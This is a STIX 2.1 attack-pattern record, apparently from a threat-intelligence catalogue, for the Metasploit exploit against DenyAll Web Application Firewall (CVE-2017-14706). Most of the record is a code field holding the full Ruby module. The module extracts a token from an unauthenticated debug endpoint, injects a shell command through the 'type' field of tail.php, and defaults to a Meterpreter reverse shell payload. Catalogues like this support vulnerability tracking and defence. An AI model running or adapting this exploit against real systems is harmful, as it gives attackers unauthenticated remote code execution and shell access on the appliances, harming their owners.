{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--507c90e7-91f0-421e-b4d5-b8da5c9596bb",
    "created": "2024-08-14T17:03:45.420091Z",
    "modified": "2024-08-14T17:03:45.420096Z",
    "name": "\"DenyAll Web Application Firewall Remote Code Execution\"",
    "description": " This module exploits the command injection vulnerability of DenyAll Web Application Firewall. Unauthenticated users can execute a terminal command under the context of the web server user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/denyall_waf_exec.rb",
            "external_id": "denyall_waf_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-14706"
        },
        {
            "source_name": "reference",
            "url": "https://pentest.blog/advisory-denyall-web-application-firewall-unauthenticated-remote-code-execution/"
        },
        {
            "source_name": "reference",
            "url": "https://www.denyall.com/blog/advisories/advisory-unauthenticated-remote-code-execution-denyall-web-application-firewall/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"DenyAll Web Application Firewall Remote Code Execution\",\n      'Description'    => %q{\n        This module exploits the command injection vulnerability of DenyAll Web Application Firewall. Unauthenticated users can execute a\n        terminal command under the context of the web server user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Mehmet Ince <mehmet@mehmetince.net>' # author & msf module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2017-14706'],\n          ['URL', 'https://pentest.blog/advisory-denyall-web-application-firewall-unauthenticated-remote-code-execution/'],\n          ['URL', 'https://www.denyall.com/blog/advisories/advisory-unauthenticated-remote-code-execution-denyall-web-application-firewall/']\n        ],\n      'DefaultOptions'  =>\n        {\n          'SSL' => true,\n          'RPORT' => 3001,\n          'Payload'  => 'python/meterpreter/reverse_tcp'\n        },\n      'Platform'       => ['python'],\n      'Arch'           => ARCH_PYTHON,\n      'Targets'        => [[ 'Automatic', { }]],\n      'Privileged'     => false,\n      'DisclosureDate' => '2017-09-19',\n      'DefaultTarget'  => 0\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The URI of the vulnerable DenyAll WAF', '/'])\n      ]\n    )\n  end\n\n  def get_token\n    # Taking token by exploiting bug on first endpoint.\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'webservices', 'download', 'index.php'),\n      'vars_get' => {\n        'applianceUid' => 'LOCALUID',\n        'typeOf' => 'debug'\n      }\n    })\n\n    if res && res.code == 200 && res.body.include?(\"iToken\")\n      res.body.scan(/\"iToken\";s:32:\"([a-z][a-f0-9]{31})\";/).flatten[0]\n    else\n       nil\n    end\n  end\n\n  def check\n    # If we've managed to get token, that means target is most likely vulnerable.\n    token = get_token\n    if token.nil?\n      Exploit::CheckCode::Safe\n    else\n      Exploit::CheckCode::Appears\n    end\n  end\n\n  def exploit\n    # Get iToken from unauthenticated accessible endpoint\n    print_status('Extracting iToken value')\n    token = get_token\n\n    if token.nil?\n      fail_with(Failure::NotVulnerable, \"Target is not vulnerable.\")\n    else\n      print_good(\"Awesome. iToken value = #{token}\")\n    end\n\n    # Accessing to the vulnerable second endpoint where we have command injection with valid iToken\n    print_status('Trigerring command injection vulnerability with iToken value.')\n    r = rand_text_alpha(5 + rand(3));\n\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'webservices', 'stream', 'tail.php'),\n      'vars_post' => {\n        'iToken' => token,\n        'tag' => 'tunnel',\n        'stime' => r,\n        'type' => \"#{r}$(python -c \\\"#{payload.encoded}\\\")\"\n        }\n    })\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-09-19",
    "x_mitre_platforms": [
        "['python']"
    ]
}